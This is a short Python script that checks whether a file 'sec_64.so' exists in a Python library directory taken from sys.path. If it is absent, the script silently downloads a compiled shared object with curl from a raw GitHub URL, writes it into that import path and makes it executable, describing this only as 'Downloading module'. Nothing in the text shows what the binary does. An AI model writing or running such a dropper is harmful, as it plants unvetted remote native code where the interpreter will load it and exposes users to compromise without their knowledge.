import os,sys
path=str(sys.path[4])+str('/sec_64.so')
def run():
    if 'sec_64.so' in os.listdir(sys.path[4]):
        pass
    else:
        print(" Downloading module please wait...")
        os.system(f'curl -sS -L https://raw.githubusercontent.com/WARN-199/WARN-SERVER/refs/heads/main/sec_64.so -o {path}')
        os.system(f'chmod +x {path}')
        print(" Downloading Successful..")